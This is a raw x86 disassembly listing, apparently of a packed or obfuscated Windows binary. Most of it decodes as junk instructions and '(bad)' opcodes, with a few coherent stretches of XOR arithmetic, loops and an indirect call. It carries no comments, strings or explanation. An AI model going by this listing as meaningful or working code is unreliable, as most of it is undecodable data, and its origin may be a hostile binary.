  40da9c:	mov    ebp,0x136bf1c6
  40daa1:	adc    BYTE PTR [ebp+0x11e53835],bl
  40daa7:	cmp    eax,0x316a0980
  40daac:	pop    esi
  40daad:	mov    dl,0x7f
  40daaf:	leave  
  40dab0:	test   edi,eax
  40dab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dab3:	mov    ebx,0x96db890f
  40dab8:	or     DWORD PTR [esi+0x14498a6b],ecx
  40dabe:	int    0x23
  40dac0:	xor    al,0x33
  40dac2:	(bad)  
  40dac3:	cs mov esi,0x6bbf3f59
  40dac9:	stc    
  40daca:	lds    eax,FWORD PTR [eax+0x532f8bef]
  40dad0:	scas   eax,DWORD PTR es:[edi]
  40dad1:	fdivr  st(4),st
  40dad3:	inc    ebx
  40dad4:	cmp    eax,0xd3ac3117
  40dad9:	repnz pushf 
  40dadb:	mov    ebx,0xb84c2294
  40dae0:	arpl   WORD PTR [ecx+0x7f],di
  40dae3:	push   ebp
  40dae4:	aaa    
  40dae5:	and    bl,0x56
  40dae8:	xlat   BYTE PTR ds:[ebx]
  40dae9:	in     eax,0xc5
  40daeb:	dec    ecx
  40daec:	out    dx,al
  40daed:	xor    DWORD PTR [esi+0x23e7c217],edx
  40daf3:	scas   eax,DWORD PTR es:[edi]
  40daf4:	jmp    0x40dadb
  40daf6:	out    dx,eax
  40daf7:	and    al,0x55
  40daf9:	push   cs
  40dafa:	mov    ebx,0x3cc02bb2
  40daff:	(bad)  
  40db00:	retf   
  40db01:	xchg   edi,eax
  40db02:	fcmove st,st(7)
  40db04:	sbb    edi,DWORD PTR [eax]
  40db06:	jge    0x40db04
  40db08:	mov    edx,0x6bb8dc62
  40db0d:	inc    edx
  40db0e:	mov    eax,ds:0x63551ae
  40db13:	jmp    FWORD PTR [esp+eiz*8-0x1b]
  40db17:	jmp    0x3321:0x3fc4c658
  40db1e:	sub    eax,0x88f80033
  40db23:	retf   
  40db24:	cli    
  40db25:	or     al,0xc2
  40db27:	mov    cl,0x6d
  40db29:	or     DWORD PTR [eax-0x2b272246],0x4d46120c
  40db33:	enter  0xcce7,0x5d
  40db37:	mov    WORD PTR [ebp-0x1f13bae4],fs
  40db3d:	push   esp
  40db3e:	push   esi
  40db3f:	cmp    edx,DWORD PTR [ebp+0x51]
  40db42:	push   0xf
  40db44:	and    DWORD PTR [ebx-0x193631d7],esi
  40db4a:	bound  esp,QWORD PTR [edi-0x5f8d375f]
  40db50:	das    
  40db51:	inc    edx
  40db52:	lahf   
  40db53:	jmp    0x6f06:0xe627a13c
  40db5a:	and    eax,0x76bfd3c
  40db5f:	mov    ebx,0x9ef8a8ba
  40db64:	in     al,dx
  40db65:	jge    0x40dafb
  40db67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db68:	jmp    0x26ed:0x1672f810
  40db6f:	js     0x40db34
  40db71:	test   ebp,ebx
  40db73:	mov    ebx,0xbbd6a6de
  40db78:	push   DWORD PTR [ecx+eax*2]
  40db7b:	ds gs xor edx,esi
  40db7f:	ja     0x40db4b
  40db81:	(bad)
  40db84:	aad    0xb5
  40db86:	fisubr WORD PTR [ecx]
  40db88:	fstp   st(2)
  40db8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db8b:	mov    al,0x8c
  40db8d:	popa   
  40db8e:	adc    ah,BYTE PTR [edx]
  40db90:	jae    0x40dbcc
  40db92:	shl    BYTE PTR [eax],1
  40db94:	(bad)  
  40db95:	xchg   esi,eax
  40db96:	sub    al,0x3f
  40db98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db99:	jmp    0x7a41224
  40db9e:	inc    eax
  40db9f:	cs test al,0xbf
  40dba2:	sbb    BYTE PTR [eax],bl
  40dba4:	cdq    
  40dba5:	sti    
  40dba6:	call   0xf8b1:0xaa155ded
  40dbad:	(bad)  
  40dbae:	cdq    
  40dbaf:	iret   
  40dbb0:	mov    DWORD PTR [edi+0x3bef7c8d],0x80850fc1
  40dbba:	add    al,BYTE PTR [eax]
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x2dbfeba4],0xfaa7d6f7
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40db6c
  40dbe0:	xchg   esp,eax
  40dbe1:	je     0x40dc56
  40dbe3:	cmp    DWORD PTR [edi+0x4846dd21],ecx
  40dbe9:	mov    eax,ds:0xa7846a14
  40dbee:	inc    ebp
  40dbef:	pop    ss
  40dbf0:	add    esp,DWORD PTR [eax+0x2b3335fe]
  40dbf6:	push   ss
  40dbf7:	out    0x65,eax
  40dbf9:	cmp    eax,DWORD PTR [esi-0x22]
  40dbfc:	push   0xffffffec
  40dbfe:	(bad)  
  40dbff:	fcom   DWORD PTR [esi+0x6165793d]
  40dc05:	or     ch,dl
  40dc07:	cmp    ah,dh
  40dc09:	dec    ebx
  40dc0a:	pop    ebp
  40dc0b:	jnp    0x40dbde
  40dc0d:	aam    0x22
  40dc0f:	push   0xffffffb8
  40dc11:	push   ecx
  40dc12:	stos   BYTE PTR es:[edi],al
  40dc13:	sub    dl,dh
  40dc15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc16:	adc    ch,BYTE PTR ds:[ebx+0x5a]
  40dc1a:	out    0x4,eax
  40dc1c:	adc    esp,DWORD PTR [ebx-0x3b9f2f7b]
  40dc22:	retf   0x7e80
  40dc25:	jne    0x890255cb
  40dc2b:	test   al,0xb6
  40dc2d:	push   esp
  40dc2e:	lock lods al,BYTE PTR ds:[esi]
  40dc30:	leave  
  40dc31:	add    BYTE PTR [ebx+0x38],cl
  40dc34:	add    al,0x11
  40dc36:	inc    edi
  40dc37:	cs nop
  40dc39:	(bad)  
  40dc3b:	jge    0x40dbe8
  40dc3d:	jmp    0x26c3:0x75100079
  40dc44:	imul   DWORD PTR [edx+esi*8-0x3]
  40dc48:	dec    ebp
  40dc49:	xchg   esp,eax
  40dc4a:	cmc    
  40dc4b:	jle    0x40dbf5
  40dc4d:	out    dx,eax
  40dc4e:	cmp    ecx,edx
  40dc50:	imul   ebp,edi,0xe5207ee1
  40dc56:	enter  0xd868,0x4e
  40dc5a:	gs pop es
  40dc5c:	mov    edi,0x753100ff
  40dc61:	sub    eax,0x426dbb32
  40dc66:	fisubr DWORD PTR [ebx+0x38cace6d]
  40dc6c:	shl    BYTE PTR [ebp+ecx*2-0x791eef26],cl
  40dc73:	pop    esp
  40dc74:	int    0xd4
  40dc76:	loopne 0x40dc91
  40dc78:	sbb    eax,0x89c964b9
  40dc7d:	cmp    BYTE PTR fs:[edx-0x6432ee12],bh
  40dc84:	or     al,0x6b
  40dc86:	pop    ss
  40dc87:	jbe    0x40dce8
  40dc89:	push   ecx
  40dc8a:	push   esi
  40dc8b:	and    al,0xa
  40dc8d:	adc    BYTE PTR [edx+ebx*1],bh
  40dc90:	or     eax,0x28f3e183
  40dc95:	add    DWORD PTR [edx+0x4d],ebp
  40dc98:	inc    sp
  40dc9a:	ja     0x40dce4
  40dc9c:	sbb    DWORD PTR [ebx+ecx*4-0x8],ebp
  40dca0:	jg     0x40dc84
  40dca2:	scas   al,BYTE PTR es:[edi]
  40dca3:	sub    BYTE PTR [ebx+0xf09d76d],al
  40dca9:	push   esi
  40dcaa:	gs mov eax,0xddd20092
  40dcb0:	pop    ds
  40dcb1:	mov    eax,ds:0x5ea0a1c5
  40dcb6:	stos   BYTE PTR es:[edi],al
  40dcb7:	mov    edx,0xdd40e7a5
  40dcbc:	push   0x54
  40dcbe:	sbb    eax,0x14300cbc
  40dcc3:	cmc    
  40dcc4:	and    eax,0xa7ed6e7e
  40dcc9:	sbb    BYTE PTR [edx-0x66],dl
  40dccc:	stc    
  40dccd:	mov    ch,0x73
  40dccf:	sub    BYTE PTR [ebx+0x8],bh
  40dcd2:	in     eax,0x35
  40dcd4:	jns    0x40dc96
  40dcd6:	mov    ch,0x96
  40dcd8:	inc    ebx
  40dcd9:	imul   esp,DWORD PTR [ebp-0x61cf7c80],0xad9be51
  40dce3:	cld    
  40dce4:	sub    eax,0xb65b7cda
  40dce9:	loopne 0x40dcab
  40dceb:	add    DWORD PTR [ecx-0x41025fd8],ebp
  40dcf1:	jne    0x40dd24
  40dcf3:	xchg   ebx,eax
  40dcf4:	sbb    BYTE PTR [ebp-0x6ec38a53],0x3b
  40dcfb:	out    0x66,eax
  40dcfd:	mov    ecx,es
  40dcff:	inc    esp
  40dd00:	cld    
  40dd01:	aam    0x75
  40dd03:	repz xor al,0xcf
  40dd06:	xor    esi,edi
  40dd08:	xchg   ebp,eax
  40dd09:	mov    edx,0x91682e24
  40dd0e:	xchg   ecx,eax
  40dd0f:	mov    ebp,0xc2bd8789
  40dd14:	out    dx,al
  40dd15:	inc    ebp
  40dd16:	jns    0x40dd17
  40dd18:	std    
  40dd19:	mov    bh,0x24
  40dd1b:	call   0x234e:0x47e90ebc
  40dd22:	and    eax,DWORD PTR [ebx]
  40dd24:	jae    0x40dcbd
  40dd26:	mov    esi,DWORD PTR [edi]
  40dd28:	xchg   edi,ecx
  40dd2a:	pushf  
  40dd2b:	and    BYTE PTR [esi+0x4],ah
  40dd2e:	push   edx
  40dd2f:	cmp    esp,DWORD PTR [ebx]
  40dd31:	add    bl,BYTE PTR [edx+0x476dc2d2]
  40dd37:	jmp    0x4201:0x1a5afe2f
  40dd3e:	ror    ebp,cl
  40dd40:	das    
  40dd41:	out    0x6c,eax
  40dd43:	pusha  
  40dd44:	fcmove st,st(2)
  40dd46:	cmp    BYTE PTR [esi+0x6b],bl
  40dd49:	cmp    DWORD PTR [ebx+0x40b76ec0],edi
  40dd4f:	fist   DWORD PTR ds:0x65ce12c8
  40dd55:	pusha  
  40dd56:	pop    ecx
  40dd57:	mov    eax,ds:0x40b2d7b9
  40dd5c:	or     BYTE PTR [esi-0x717f4d04],ch
  40dd62:	and    eax,0xf7ab8622
  40dd67:	cmp    DWORD PTR [edi-0x5c],esp
  40dd6a:	cmp    ah,BYTE PTR [edx+0x7afdf787]
  40dd70:	adc    al,0xa5
  40dd72:	xchg   ebx,eax
  40dd73:	clc    
  40dd74:	out    dx,eax
  40dd75:	adc    al,0xcc
  40dd77:	dec    edi
  40dd78:	inc    esi
  40dd79:	xor    BYTE PTR [eax+0x55],0xf6
  40dd7d:	dec    ebx
  40dd7e:	and    dl,BYTE PTR [ecx]
  40dd80:	xor    al,0x48
  40dd82:	iret   
  40dd83:	jp     0x40dd91
  40dd85:	shr    DWORD PTR [ecx+0x6c],1
  40dd88:	and    eax,0x8da15ba7
  40dd8d:	sub    dh,BYTE PTR [esi-0x3f342242]
  40dd93:	sbb    BYTE PTR [eax],0x30
  40dd96:	pusha  
  40dd97:	add    eax,DWORD PTR [ecx]
  40dd99:	mov    esp,0x37e9cfa0
  40dd9e:	popa   
  40dd9f:	stos   BYTE PTR es:[edi],al
  40dda0:	xchg   ecx,eax
  40dda1:	mov    bh,0x75
  40dda3:	xchg   esp,eax
  40dda4:	push   ds
  40dda5:	push   ebx
  40dda6:	mov    eax,0x5eab5eca
  40ddab:	mov    ch,0x34
  40ddad:	mov    ds:0xd8f36b8d,al
  40ddb2:	add    cl,dl
  40ddb4:	enter  0x5829,0xd6
  40ddb8:	jne    0x40de22
  40ddba:	or     ebp,DWORD PTR [edx+edi*4]
  40ddbd:	cs push ds
  40ddbf:	jmp    0xbd9d:0x3381b56f
  40ddc6:	fnstcw WORD PTR [ebx+0x2da5387a]
  40ddcc:	pop    ss
  40ddcd:	sub    ecx,edx
  40ddcf:	xor    al,0xe9
  40ddd1:	fstp   TBYTE PTR [esi]
  40ddd3:	call   0x7f73ae5c
  40ddd8:	loope  0x40de24
  40ddda:	repz sbb eax,DWORD PTR [edx-0x764ecc9c]
  40dde1:	mov    edx,0x2d7251c4
  40dde6:	neg    BYTE PTR [edi]
  40dde8:	int3   
  40dde9:	inc    ebp
  40ddea:	ss xchg ecx,eax
  40ddec:	jp     0x40de4e
  40ddee:	fimul  DWORD PTR [edi]
  40ddf0:	mov    bh,0xba
  40ddf2:	rcr    al,cl
  40ddf4:	out    dx,eax
  40ddf5:	iret   
  40ddf6:	pop    ebx
  40ddf7:	inc    edi
  40ddf8:	add    al,0x58
  40ddfa:	in     al,dx
  40ddfb:	mov    al,ds:0xcb83703b
  40de00:	retf   0xe2d3
  40de03:	mov    ebx,0xe76ee176
  40de08:	push   ss
  40de09:	cmc    
  40de0a:	imul   edi,DWORD PTR [eax+ecx*2],0xffffffe6
  40de0e:	mov    dl,0x8e
  40de10:	adc    ah,bl
  40de12:	add    al,0x43
  40de14:	jmp    0x40ddc3
  40de16:	xchg   esp,eax
  40de17:	jl     0x40de88
  40de19:	dec    eax
  40de1a:	or     BYTE PTR [eax+0x47],cl
  40de1d:	sahf   
  40de1e:	ds add eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43379f,0x0
  40de5a:	mov    eax,ds:0x43379f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43379f,eax
  40de65:	cmp    DWORD PTR ds:0x43379f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43379f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4337ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	idiv   edx
  40dea7:	loop   0x40df09
  40dea9:	mov    eax,0x7e7e9cba
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40df05
  40deb3:	xchg   ebp,eax
  40deb4:	xor    DWORD PTR [ebx-0x52],ebp
  40deb7:	icebp  
  40deb8:	nop
  40deb9:	pop    ebp
  40deba:	mov    DWORD PTR [esi+0x6f],esp
  40debd:	lock or eax,0xca4fed4a
  40dec3:	cwde   
  40dec4:	jnp    0x40de80
  40dec6:	mov    BYTE PTR [ebx+esi*8-0x629bc73a],0x85
  40dece:	js     0x40df4f
  40ded0:	rcl    DWORD PTR [eax],cl
  40ded2:	std    
  40ded3:	in     eax,0xbd
  40ded5:	cld    
  40ded6:	daa    
  40ded7:	ret    0x821b
  40deda:	and    al,0x23
  40dedc:	fcomp  QWORD PTR [eax+ebx*2]
  40dedf:	mov    ah,0xb
  40dee1:	fidivr DWORD PTR [esi-0x45661110]
  40dee7:	cmp    DWORD PTR [ebx],esi
  40dee9:	fisttp WORD PTR [edx+esi*2]
  40deec:	jae    0x40df56
  40deee:	xchg   edi,eax
  40deef:	lock mov ecx,0x5d984a8
  40def5:	xchg   ebp,eax
  40def6:	cmp    bl,0xfe
  40def9:	push   0xffffffdb
  40defb:	sub    DWORD PTR [esp+edi*1+0x45],0xfcd018cc
  40df03:	loope  0x40de97
  40df05:	dec    eax
  40df06:	jg     0x40debc
  40df08:	dec    edx
  40df09:	aaa    
  40df0a:	xor    DWORD PTR [ebx],ecx
  40df0c:	pop    es
  40df0d:	sbb    al,0x47
  40df0f:	(bad)  
  40df10:	sbb    BYTE PTR [edx+0x56870c06],dl
  40df16:	in     eax,0xce
  40df18:	jae    0x40decc
  40df1a:	xor    eax,0x9cef73c2
  40df1f:	out    0xb5,eax
  40df21:	stos   BYTE PTR es:[edi],al
  40df22:	in     al,dx
  40df23:	pop    esp
  40df24:	pusha  
  40df25:	not    ebx
  40df27:	xor    BYTE PTR [ecx-0x21613709],0x6f
  40df2e:	popf   
  40df2f:	xchg   esi,eax
  40df30:	cmp    esp,DWORD PTR ds:0xfafda6e2
  40df36:	enter  0xf7c5,0x78
  40df3a:	push   ebp
  40df3b:	icebp  
  40df3c:	jns    0x40df71
  40df3e:	dec    ecx
  40df3f:	push   esi
  40df40:	push   ecx
  40df41:	call   0x3a2a:0xd4240430
  40df48:	ins    DWORD PTR es:[edi],dx
  40df49:	icebp  
  40df4a:	(bad)  
  40df4b:	xor    DWORD PTR [edx+0x308a577c],edx
  40df51:	stc    
  40df52:	cmp    al,0x9d
  40df54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df55:	push   esi
  40df56:	xlat   BYTE PTR ds:[ebx]
  40df57:	jne    0x40df0a
  40df59:	icebp  
  40df5a:	dec    esp
  40df5b:	jg     0x40df5c
  40df5d:	jge    0x40df00
  40df5f:	addr16 sbb eax,0xea102ac5
  40df65:	in     eax,dx
  40df66:	fistp  DWORD PTR cs:[ebx]
  40df69:	mov    bh,0x6c
  40df6b:	sahf   
  40df6c:	sub    DWORD PTR [ebp+0x78],edx
  40df6f:	mov    eax,0x7080e185
  40df74:	sbb    eax,0x46b9e31f
  40df79:	(bad)  
  40df7a:	sbb    eax,0xc9d1038
  40df7f:	adc    DWORD PTR [esi+0x6c],esi
  40df82:	fs out 0x88,eax
  40df85:	bound  ebx,QWORD PTR [edi+0x43]
  40df88:	repnz leave 
  40df8a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df8c:	inc    ebp
  40df8d:	mov    al,ds:0x99846229
  40df92:	xlat   BYTE PTR ds:[ebx]
  40df93:	inc    esi
  40df94:	xor    al,0x15
  40df96:	xlat   BYTE PTR ds:[ebx]
  40df97:	push   ds
  40df98:	or     ebx,DWORD PTR [ecx]
  40df9a:	jne    0x40df9b
  40df9c:	mov    dh,0x4f
  40df9e:	fmul   DWORD PTR [ecx*4-0x2437782c]
  40dfa5:	iret   
  40dfa6:	js     0x40dfe7
  40dfa8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40dfaa:	dec    ecx
  40dfab:	in     eax,0xa6
  40dfad:	int3   
  40dfae:	mov    esp,0x975eb8cd
  40dfb3:	icebp  
  40dfb4:	(bad)  
  40dfb5:	hlt    
  40dfb6:	out    dx,al
  40dfb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfb8:	sbb    DWORD PTR [esi+esi*4],ecx
  40dfbb:	jmp    0xf05197b4
  40dfc0:	scas   eax,DWORD PTR es:[edi]
  40dfc1:	and    BYTE PTR [ebx-0xadd7baf],ch
  40dfc7:	mov    eax,0xa26162b9
  40dfcc:	mov    edi,0x8458b35
  40dfd1:	sub    DWORD PTR ds:0x433797,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4337eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	sbb    eax,0x5e6756b5
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e086
  40e010:	ins    BYTE PTR es:[edi],dx
  40e011:	sbb    eax,0x96453cbe
  40e016:	and    DWORD PTR [eax],ebx
  40e018:	clc    
  40e019:	and    BYTE PTR [esi],bh
  40e01b:	hlt    
  40e01c:	fldenv [ecx+0x4a866d89]
  40e022:	mov    ch,0xc4
  40e024:	bound  esi,QWORD PTR [ecx+0x2e]
  40e027:	sbb    al,0x78
  40e029:	iret   
  40e02a:	out    0x4,al
  40e02c:	xchg   DWORD PTR [edi-0x71df1bb3],edx
  40e032:	(bad)  
  40e033:	pop    ebx
  40e034:	push   edx
  40e035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e036:	mov    ds:0x46232111,al
  40e03b:	mov    bh,0x3c
  40e03d:	mov    eax,ds:0xb1a1cf76
  40e042:	jo     0x40e056
  40e044:	test   BYTE PTR [edx-0x4f],0x56
  40e048:	popa   
  40e049:	dec    ebp
  40e04a:	xchg   dh,ah
  40e04c:	and    eax,DWORD PTR [edi]
  40e04e:	cmp    ebx,DWORD PTR [esi-0x73]
  40e051:	push   eax
  40e052:	jmp    0x67a0:0x7dba7eb
  40e059:	ins    BYTE PTR es:[edi],dx
  40e05a:	std    
  40e05b:	cli    
  40e05c:	cwde   
  40e05d:	xchg   edx,eax
  40e05e:	jae    0x44304ef
  40e064:	(bad)  
  40e065:	dec    esp
  40e066:	ja     0x40e01d
  40e068:	fbstp  TBYTE PTR [eax+0x5ffc77b2]
  40e06e:	ins    BYTE PTR es:[edi],dx
  40e06f:	fucomip st,st(5)
  40e071:	es popa 
  40e073:	jg     0x40e06c
  40e075:	nop
  40e076:	dec    ecx
  40e077:	sbb    BYTE PTR [bp+0x42d4],al
  40e07c:	push   0x46a86dbc
  40e081:	fst    QWORD PTR [ebx-0x55]
  40e084:	cld    
  40e085:	mov    ah,0x4f
  40e087:	hlt    
  40e088:	fs sbb al,0x8b
  40e08b:	pop    ds
  40e08c:	xchg   edi,eax
  40e08d:	push   ss
  40e08e:	call   0x4540:0xc1504ba6
  40e095:	repz fs xchg esi,eax
  40e098:	rcr    DWORD PTR ds:0x16be05f3,1
  40e09e:	pop    edi
  40e09f:	inc    eax
  40e0a0:	cmp    BYTE PTR [eax-0x53],al
  40e0a3:	popf   
  40e0a4:	frstor [edx]
  40e0a6:	push   ebx
  40e0a7:	mov    edx,0xc6779413
  40e0ac:	test   DWORD PTR [ecx+0x41],ebx
  40e0af:	mov    esp,0xb7dce5ec
  40e0b4:	sar    BYTE PTR [ecx+0x4df6702b],cl
  40e0ba:	rcr    WORD PTR [edx-0x66],cl
  40e0be:	xchg   esi,eax
  40e0bf:	jecxz  0x40e113
  40e0c1:	pop    ds
  40e0c2:	arpl   WORD PTR [ecx+0x5337d473],dx
  40e0c8:	scas   al,BYTE PTR es:[edi]
  40e0c9:	inc    edx
  40e0ca:	pop    ss
  40e0cb:	stos   BYTE PTR es:[edi],al
  40e0cc:	sbb    DWORD PTR [edx-0xa],edi
  40e0cf:	sub    eax,0x780948fa
  40e0d4:	clc    
  40e0d5:	add    BYTE PTR [ecx+eax*1-0xf],ah
  40e0d9:	mov    esp,0x6b94f1c4
  40e0de:	rcl    BYTE PTR [edi-0x74],0x8a
  40e0e2:	leave  
  40e0e3:	mov    ?,WORD PTR [eax-0x51]
  40e0e6:	mov    dl,0x37
  40e0e8:	repz fwait
  40e0ea:	sbb    al,0xb9
  40e0ec:	add    BYTE PTR [ecx],al
  40e0ee:	pop    ebp
  40e0ef:	xchg   DWORD PTR ds:0x1e2332ae,esi
  40e0f5:	pop    ecx
  40e0f6:	dec    esi
  40e0f7:	into   
  40e0f8:	push   edx
  40e0f9:	gs stc 
  40e0fb:	popa   
  40e0fc:	adc    cl,ah
  40e0fe:	pop    eax
  40e0ff:	inc    esi
  40e100:	cdq    
  40e101:	enter  0x8d7a,0x54
  40e105:	sti    
  40e106:	(bad)  
  40e107:	loop   0x40e10c
  40e109:	nop
  40e10a:	dec    ebp
  40e10b:	sbb    al,ah
  40e10d:	sub    ecx,DWORD PTR [ebx-0x40]
  40e110:	adc    eax,0x39308d39
  40e115:	or     eax,0xc5274cd6
  40e11a:	test   eax,0xf02f9859
  40e11f:	pusha  
  40e120:	aaa    
  40e121:	call   0x2c50:0x4ae71515
  40e128:	xchg   esi,eax
  40e129:	add    ebx,DWORD PTR ds:0x1581c633
  40e12f:	mov    ds:0x97004337,eax
  40e134:	and    BYTE PTR [eax],al
  40e136:	add    BYTE PTR [ebx+0x32729b],bh
  40e13c:	xor    DWORD PTR ds:0x4337ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	repz dec edx
  40e15c:	sbb    eax,0x7e9a721d
  40e161:	jle    0x40e175
  40e163:	jg     0x40e1e3
  40e165:	jle    0x40e121
  40e167:	loop   0x40e12d
  40e169:	stc    
  40e16a:	arpl   di,cx
  40e16c:	xchg   ecx,eax
  40e16d:	nop
  40e16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e16f:	pop    esp
  40e170:	push   esp
  40e171:	pop    ebx
  40e172:	daa    
  40e173:	inc    edi
  40e174:	xor    DWORD PTR [eax+0x5948fdb4],ebp
  40e17a:	mov    cl,0xf8
  40e17c:	fisub  DWORD PTR [edi+0x78]
  40e17f:	push   eax
  40e180:	push   cs
  40e181:	sub    BYTE PTR [eax+0x482eaea9],bh
  40e187:	push   ecx
  40e188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e189:	mov    ebp,0x6f9d7cf0
  40e18e:	test   eax,0x94f5d2e
  40e193:	rcl    DWORD PTR [edx-0x68],1
  40e196:	sbb    BYTE PTR [ecx-0x1475e4],0x5a
  40e19d:	jmp    0xf098:0x293982d
  40e1a4:	ja     0x40e19a
  40e1a6:	daa    
  40e1a7:	scas   al,BYTE PTR es:[edi]
  40e1a8:	scas   eax,DWORD PTR es:[edi]
  40e1a9:	dec    edx
  40e1aa:	in     al,dx
  40e1ab:	xchg   DWORD PTR [edx+0x4d],esi
  40e1ae:	addr16 jle 0x40e164
  40e1b1:	test   al,0x4f
  40e1b3:	jge    0x40e231
  40e1b5:	test   dh,dh
  40e1b7:	in     al,0x7f
  40e1b9:	or     DWORD PTR [ecx-0x64],edx
  40e1bc:	jne    0x40e154
  40e1be:	(bad)  
  40e1bf:	mov    DWORD PTR [ebp+0x507cb302],esp
  40e1c5:	imul   ebx,DWORD PTR [edx+0x70],0xa625f69
  40e1cc:	cs ja  0x40e196
  40e1cf:	fsubr  st,st(0)
  40e1d1:	cmp    BYTE PTR ds:0x71dd10ea,bl
  40e1d7:	call   0xa6e7:0xe37efd86
  40e1de:	mov    dh,0x65
  40e1e0:	mov    eax,ds:0x812ff02d
  40e1e5:	pop    esi
  40e1e6:	je     0x40e253
  40e1e8:	push   eax
  40e1e9:	clc    
  40e1ea:	sbb    DWORD PTR gs:[eax-0x2a],0x28bd1cc2
  40e1f2:	sar    BYTE PTR [edx],cl
  40e1f4:	inc    edx
  40e1f5:	pusha  
  40e1f6:	ret    
  40e1f7:	mov    ds:0x86b39676,eax
  40e1fc:	or     bh,dh
  40e1fe:	fmul   DWORD PTR ds:0xe55f704b
  40e204:	mov    eax,0x21695ea8
  40e209:	push   ecx
  40e20a:	xlat   BYTE PTR ds:[ebx]
  40e20b:	push   0xc9efe44a
  40e210:	push   eax
  40e211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e212:	lods   al,BYTE PTR ds:[esi]
  40e213:	cmp    bh,bl
  40e215:	add    al,0x77
  40e217:	xchg   ecx,eax
  40e218:	fisub  DWORD PTR [eax]
  40e21a:	dec    eax
  40e21b:	jb     0x40e23e
  40e21d:	dec    BYTE PTR ds:0xe36faa62
  40e223:	arpl   WORD PTR [esi+0x71],ax
  40e226:	jmp    0x40e246
  40e228:	js     0x40e22f
  40e22a:	fimul  WORD PTR [ebx-0x3]
  40e22d:	int    0x30
  40e22f:	dec    eax
  40e230:	outs   dx,DWORD PTR ds:[esi]
  40e231:	dec    edi
  40e232:	ror    BYTE PTR [edi+0x3db42b5a],0x84
  40e239:	fwait
  40e23a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e23b:	in     eax,dx
  40e23c:	jmp    0x40e2bb
  40e23e:	imul   eax,edx,0x7e
  40e241:	mov    ds:0xff0dab6f,al
  40e246:	fisttp QWORD PTR [edx-0x55eb0925]
  40e24c:	out    0xa2,eax
  40e24e:	add    al,0x9e
  40e250:	dec    esp
  40e251:	and    eax,0x16090a3d
  40e256:	xor    ch,BYTE PTR [edx-0x20]
  40e259:	mov    ebx,0x3bb40d15
  40e25e:	cmp    BYTE PTR [eax],bh
  40e260:	loope  0x40e258
  40e262:	push   ds
  40e263:	push   es
  40e264:	fistp  DWORD PTR [ecx]
  40e266:	mov    ah,0x90
  40e268:	lahf   
  40e269:	(bad)  
  40e26a:	xchg   edx,eax
  40e26b:	scas   eax,DWORD PTR es:[edi]
  40e26c:	enter  0x604c,0x25
  40e270:	outs   dx,BYTE PTR ds:[esi]
  40e271:	and    al,0xb5
  40e273:	fisub  WORD PTR [edi+edx*8-0x20830473]
  40e27a:	sub    DWORD PTR [ecx],esp
  40e27c:	adc    dh,dl
  40e27e:	dec    eax
  40e27f:	cmp    dl,BYTE PTR [ebp-0x44]
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43370b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4337e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
